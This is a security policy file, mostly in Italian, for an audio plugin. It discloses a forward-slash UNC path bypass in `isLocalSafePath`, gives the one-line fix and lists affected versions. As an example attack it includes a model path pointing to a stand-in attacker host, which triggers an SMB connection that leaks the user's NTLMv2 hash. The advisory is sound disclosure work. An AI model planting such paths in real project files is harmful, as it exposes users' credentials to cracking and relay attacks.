# Security Policy

## Known Vulnerabilities

### CVE-pending — UNC forward-slash path bypass (`isLocalSafePath`) — **Severity: HIGH**

| | |
|---|---|
| **Componente** | `juce/PluginProcessor.cpp` — `isLocalSafePath()` |
| **Versioni binari affette** | v0.1.3 (Linux), v0.1.3-windows — **i binari pre-compilati di queste release contengono ancora la vulnerabilità** |
| **Fix nel sorgente** | ✅ Incluso nel branch `juce-rewrite` (commit che aggiunge `if (p.startsWith ("//")) return false;`) |
| **Prossima release** | Includerà il fix |

**Descrizione:**  
La funzione `isLocalSafePath` bloccava i percorsi UNC Windows nella forma backslash (`\\\\server\\share`) ma non nella forma equivalente con forward-slash (`//server/share`). Su Windows entrambe le forme sono risolte identicamente dall'API Win32.

Un progetto DAW (Reaper, Ableton, FL Studio, ecc.) con stato plugin serializzato contenente `modelPath = "//attacker.com/share/evil.nam"` supera tutti i controlli della funzione e causa una connessione SMB verso il server remoto, trasmettendo l'hash NTLMv2 dell'utente — utilizzabile per offline cracking o NTLM relay attack.

**Fix applicato:**
```cpp
// Reject forward-slash UNC paths (//server/share) — identical to \\server\share on Windows
if (p.startsWith ("//")) return false;
```

---

## Supported Versions

| Versione | Supportata | Note |
| -------- | ---------- | ----- |
| 1.3.1 (sorgente) | ✅ | Fix UNC path incluso nel sorgente |
| 1.3.1 (binari pre-compilati) | ⚠️ | Vulnerabilità UNC path **non corretta** — compilare dal sorgente |
| 1.2.x e precedenti | ❌ | |

## Reporting a Vulnerability

Per segnalare una vulnerabilità di sicurezza, apri una **GitHub Security Advisory** (privata) tramite la sezione [Security](../../security/advisories/new) del repository, oppure contatta direttamente il maintainer aprendo una issue con tag `security`.
